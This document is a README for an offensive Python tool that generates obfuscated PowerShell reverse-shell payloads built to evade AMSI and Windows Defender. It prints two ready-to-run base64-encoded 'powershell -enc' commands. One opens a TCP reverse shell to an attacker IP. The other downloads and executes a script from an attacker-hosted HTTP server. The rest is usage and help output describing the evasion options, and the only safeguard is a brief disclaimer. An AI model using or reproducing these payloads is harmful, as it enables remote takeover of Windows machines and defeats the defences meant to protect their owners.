# BypassAMSI PowerShell Revshell

---

## "Revshell" command
Generates an obfuscated `PowerShell` reverse shell payload based on original [Nishang Reverse shell PS oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1).

### Usage
```shell-session
python3 BypassAMSI_PSRevshell.py revshell -i <Attacker-IP> -p <listening-port>
```

For example:
```shell-session
❯ python3 BypassAMSI_PSRevshell.py revshell -i 10.10.10.10 -p 4444
```

Will generate the payload:
```powershell
powershell -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADAALgAxADAAJwAsADQANAA0ADQAKQA7ACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgACAAPQAgACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAnAD4AIAAnADsAJABzAHkAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAeQAsADAALAAkAHMAeQAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==
```

---

## "Server" command
This option will create a payload file, by default named `revshell.ps1` (which is the obfuscated payload from `revshell` command written into a file), and expose it into a temporal HTTP server (by default on port `8000`, which can be changed as well). The script will then generate an encoded payload that will request the file to the temporal server, executes it and triggers the reverse shell.

### Usage
```shell-session
python3 BypassAMSI_PSRevshell.py server -i <Attacker-IP> -p <listening-port>
```

For example:
```shell-session
❯ python3 BypassAMSI_PSRevshell.py server -i 10.10.10.10 -p 4444 --server-port 9000
```
Will generate the payload:
```powershell
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAA6ADkAMAAwADAALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAiACkA
```
Executing it on the victim machine will make a request to the HTTP server exposed and the payload file.

---

## Help message
```shell-session
❯ python3 BypassAMSI_PSRevshell.py revshell -h

usage: python3 BypassAMSI_PSRevshell.py revshell [-h] -i ATTACKER_IP -p PORT [-v] [--keep-pwd] [--enc-b64] [--no-banner]

Generate an obfuscated PowerShell payload to avoid Windows Defender

options:
  -h, --help            show this help message and exit
  -i ATTACKER_IP, --attacker-ip ATTACKER_IP
                        Attacker IP address.
  -p PORT, --port PORT  Port to get revshell.
  -v, --verbose         Display payloads used and generated, along with some extra info.
  --keep-pwd            Revshell obtained will show working directory/path. Keeping this might trigger AMSI/Defender.
  --enc-b64             Encode in base64 the Attacker IP address and port provided to the payload.
  --no-banner           Do not print script banner.

Example: BypassAMSI_PSRevshell.py revshell -i 10.10.16.98 -p 4444
```

```shell-session
❯ python3 BypassAMSI_PSRevshell.py server -h

usage: python3 BypassAMSI_PSRevshell.py server [-h] -i ATTACKER_IP -p PORT [--server-port SERVER_PORT] [-o OUTFILE] [-v] [--keep-pwd] [--keep-file] [--enc-b64]
                                               [--no-banner]

Generate an obfuscated PowerShell payload to avoid Windows Defender

options:
  -h, --help            show this help message and exit
  -i ATTACKER_IP, --attacker-ip ATTACKER_IP
                        Attacker IP address serving temporal HTTP server.
  -p PORT, --port PORT  Listening port to get reverse shell.
  --server-port SERVER_PORT
                        Port serving temporal HTTP server. Default: 8000.
  -o OUTFILE, --outfile OUTFILE
                        Name of the temporal PowerShell file storing obfuscated payload. Default: revshell.ps1
  -v, --verbose         Display payloads used and generated, along with some extra info.
  --keep-pwd            Revshell obtained will show working directory/path. Keeping this might trigger AMSI/Defender.
  --keep-file           This script will create a file named as "--outfile" flag and then is deleted. Use this flag if you want to keep the generated file/payload.
  --enc-b64             Encode in base64 the Attacker IP address and port provided to the payload.
  --no-banner           Do not print script banner.

Example: BypassAMSI_PSRevshell.py server -i 10.10.16.98
```

---

## Disclaimer
Always use it under your own responsability. Be ethical (:
